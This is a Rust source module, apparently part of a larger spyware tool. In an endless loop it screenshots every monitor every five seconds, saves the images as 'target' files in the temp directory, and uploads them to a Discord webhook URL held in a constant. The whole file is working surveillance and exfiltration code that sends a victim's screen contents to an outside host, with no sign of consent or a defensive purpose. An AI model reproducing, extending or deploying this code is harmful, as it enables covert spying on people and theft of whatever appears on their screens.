use screenshots::Screen;
use anyhow::Result;
use std::{
    thread,
    time::Duration,
    path::PathBuf,
    env
};
use serenity::{
    http::Http,
    model::{
        channel::AttachmentType,
        webhook::Webhook,
    },
};
use crate::constants;


// Loop to take a screen every 5 seconds
pub async fn run() {
    loop {
        thread::sleep(Duration::from_millis(5000));
        let screens = screenshot();
        send(screens).await;
    }
}

// Send elements to Discord servers with Discord Webhooks.
async fn send(files: Vec<PathBuf>) -> Result<()> {
    let http = Http::new("token");
    let url = constants::SCREENSHOTS_URL;

    // Create webhook.
    let webhook = Webhook::from_url(&http, url).await?;

    // Execute Webhook, add metadata, content and files.
    webhook
        .execute(&http, true, |w| {
            w.content("content")
                .username("username");
            for file in &files {
                w.add_file(AttachmentType::Path(file));
            }
            w
        })
        .await?;
    Ok(())
}

//Take a screenshot
pub fn screenshot() -> Vec<PathBuf> {
    let screens = Screen::all().unwrap();
    let mut paths = Vec::new();

    for (i, screen) in screens.iter().enumerate() {
        let image = screen.capture().unwrap();
        let file_path = env::temp_dir().join(format!("target_{}.png", i));
        image.save(&file_path).unwrap();
        paths.push(file_path);
    }
    paths
}